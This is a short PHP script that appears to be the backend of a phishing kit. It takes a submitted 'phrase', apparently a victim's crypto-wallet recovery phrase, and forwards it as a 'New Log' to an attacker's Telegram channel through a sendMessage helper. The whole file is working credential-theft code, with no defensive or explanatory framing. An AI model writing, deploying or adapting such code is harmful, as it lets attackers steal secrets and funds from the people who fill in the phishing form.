<?php
require_once 'telegram.php';
require_once 'mail.php';

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die(json_encode(array('error' => 'Invalid request')));
}

$phrase = $_POST['phrase'];

if (empty($phrase)) {
    die(json_encode(array('error' => 'Invalid request')));
}

$telegramMessage = '<b>💸 New Log 💸</b>';
$telegramMessage .= "\n\n";
$telegramMessage .= '<b>Phrase: </b>' . $phrase;

sendMessage($telegramMessage);
